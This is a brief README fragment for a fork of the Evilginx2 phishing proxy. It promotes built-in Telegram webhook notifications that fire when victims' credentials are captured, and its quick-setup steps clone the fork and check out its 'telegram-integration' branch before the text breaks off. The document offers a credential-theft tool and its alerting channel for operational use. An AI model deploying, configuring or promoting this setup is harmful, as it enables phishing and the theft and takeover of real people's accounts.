# Evilginx2 Webhook Integration

This fork includes built-in webhook integration for automatic Telegram notifications when credentials are captured.

## Quick Setup

1. Clone this repository:
   ```bash
   git clone https://github.com/baba1533/evilginx2.git
   cd evilginx2
   git checkout telegram-integration
